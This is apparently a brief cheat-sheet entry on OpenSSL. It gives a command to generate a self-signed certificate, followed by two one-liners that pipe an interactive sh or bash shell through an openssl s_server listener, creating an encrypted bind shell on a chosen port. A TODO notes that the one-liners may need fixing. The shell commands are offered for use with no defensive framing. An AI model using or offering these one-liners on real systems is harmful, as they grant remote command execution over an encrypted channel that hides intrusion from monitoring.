# OpenSSL

- Generate TLS certificate

```
$ openssl req -x509 -newkey rsa:4096 -keyout private.key -out certificate.crt -days 365 -nodes
```

- Execute one-liner

TODO: Modify to ensure it works

```
$ mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>; rm /tmp/f

$ mkfifo /tmp/f; /bin/bash -i < /tmp/f 2>&1 | openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>; rm /tmp/f
```